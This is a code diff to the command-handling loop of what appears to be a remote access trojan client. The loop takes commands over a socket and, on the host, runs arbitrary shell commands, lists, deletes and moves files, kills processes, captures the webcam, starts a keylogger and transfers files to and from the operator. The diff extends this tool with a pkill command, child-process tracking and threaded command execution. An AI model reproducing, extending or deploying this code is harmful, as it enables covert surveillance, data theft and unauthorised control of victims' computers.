@@ -18,7 +18,7 @@ def handle_session(sock, platform):
 
     keylog = None
     keylog_thread = None
-    proc = None
+    proc_holder = {'proc': None}
 
     while True:
         command = reliable_recv(sock)
@@ -28,13 +28,14 @@ def handle_session(sock, platform):
             pass
 
         if command == 'terminate':
-            if proc and proc.poll() is None:
+            p = proc_holder.get('proc')
+            if p and p.poll() is None:
                 try:
                     subprocess.call(
-                        platform.kill_process_cmd(proc.pid).split(),
+                        platform.kill_process_cmd(p.pid),
                         shell=True
                     )
-                    proc = None
+                    proc_holder['proc'] = None
                 except Exception:
                     pass
             continue
@@ -49,28 +50,31 @@ def handle_session(sock, platform):
             reliable_send(sock, '[+] Screen cleared on server')
 
         elif command.startswith('ls'):
-            path = command[3:] if len(command) > 3 else None
+            path = (command[2:].strip() or None) if len(command) > 2 else None
             list_dir(sock, platform, path)
         elif command.startswith('cd '):
-            change_dir(sock, command[3:])
+            change_dir(sock, command[3:].strip())
         elif command == 'pwd':
             current_dir(sock)
         elif command.startswith('rm '):
-            delete(sock, command[3:])
+            delete(sock, command[3:].strip())
         elif command.startswith('mv '):
-            move(sock, command[3:])
+            move(sock, command[3:].strip())
         elif command.startswith('cat '):
-            read_file(sock, platform, command[4:])
+            read_file(sock, platform, command[4:].strip())
         elif command.startswith('touch '):
-            touch(sock, platform, command[6:])
+            touch(sock, platform, command[6:].strip())
         elif command == 'ps' or command == 'ifconfig' or command == 'ip addr':
             shell_cmd = platform.process_list_cmd() if command == 'ps' else platform.network_info_cmd()
-            run_command(sock, shell_cmd)
+            run_command(sock, shell_cmd, proc_holder)
         elif command.startswith('kill '):
-            kill_process(sock, platform, command[5:])
+            kill_process(sock, platform, command[5:].strip())
+        elif command.startswith('pkill '):
+            shell_cmd = platform.pkill_cmd(command[6:].strip())
+            run_command(sock, shell_cmd, proc_holder)
         elif command.startswith('grep '):
-            shell_cmd = platform.grep_cmd(command[5:])
-            run_command(sock, shell_cmd)
+            shell_cmd = platform.grep_cmd(command[5:].strip())
+            run_command(sock, shell_cmd, proc_holder)
 
         elif command == 'sysinfo':
             result = get_sysinfo(platform, sock)
@@ -95,10 +99,10 @@ def handle_session(sock, platform):
             webcam_capture(sock)
 
         elif command.startswith('upload'):
-            download_file(sock, command[7:])
-            reliable_send(sock, f'[+] File received: {command[7:]}')
+            download_file(sock, command[7:].strip())
+            reliable_send(sock, f'[+] File received: {command[7:].strip()}')
         elif command.startswith('download'):
-            upload_file(sock, command[9:])
+            upload_file(sock, command[9:].strip())
 
         elif command == 'keylog_start':
             from client.modules.keylogger import Keylogger
@@ -132,7 +136,10 @@ def handle_session(sock, platform):
             reliable_send(sock, result)
 
         elif command.startswith('sendall '):
-            sendall_command(sock, command[8:])
+            sendall_command(sock, command[8:].strip())
 
         else:
-            run_command(sock, command)
+            t = threading.Thread(target=run_command, args=(sock, command, proc_holder))
+            t.daemon = True
+            t.start()
+            t.join()
